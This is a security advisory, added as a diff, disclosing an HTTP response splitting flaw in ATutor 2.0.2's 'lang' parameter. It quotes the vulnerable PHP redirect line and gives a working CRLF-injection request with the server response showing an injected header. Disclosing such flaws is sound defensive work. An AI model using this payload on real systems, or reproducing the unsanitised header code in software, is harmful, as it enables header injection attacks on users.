@@ -1,0 +1,70 @@
+
+ATutor 2.0.2 (lang) HTTP Response Splitting Vulnerability
+
+
+Vendor: ATutor (Inclusive Design Institute)
+Product web page: http://www.atutor.ca
+Affected version: 2.0.2 (build r10589)
+
+Summary: ATutor is an Open Source Web-based Learning Content Management
+System (LCMS) designed with accessibility and adaptability in mind.
+Educators can quickly assemble, package, and redistribute Web-based
+instructional content, easily retrieve and import prepackaged content,
+and conduct their courses online.
+
+Desc: Input passed to the 'lang' parameter in '/documentation/index_list.php'
+is not properly sanitised before being returned to the user. This can be
+exploited to insert arbitrary HTTP headers, which are included in a response
+sent to the user.
+
+
+======================== vulnerable code ========================
+
+/documentation/index_list.php:
+------------------------------
+
+1: <?php
+2: header('Location: index/index.php?'.$_GET['lang']);
+3: exit;
+4: ?>
+
+======================= /vulnerable code ========================
+
+
+Tested on: Microsoft Windows XP Professional SP3 (EN)
+           Apache 2.2.14 (Win32)
+           PHP 5.3.1
+           MySQL 5.1.41
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2011-5037
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5037.php
+
+
+31.07.2011
+--
+
+
+ [GET] http://10.0.0.13/documentation/index_list.php?lang=%0d%0a%20ZSL%2dCustom%2dHeader%3alove_injection
+
+ ----
+
+ HTTP/1.1 302 Found
+ Date: Sun, 31 Jul 2011 21:08:54 GMT
+ Server: Apache/2.2.14 (Win32)
+ X-Powered-By: PHP/5.3.1
+ Location: index/index.php?
+ ZSL-Custom-Header: love_injection
+ Content-Length: 0
+ Connection: close
+ Content-Type: text/html
+
+
+
+--
+Copyleft (c) Zero Science Lab - Information Security Services
+This advisory is best viewed in maximized Notepad on 1680x1050 screen resolution.
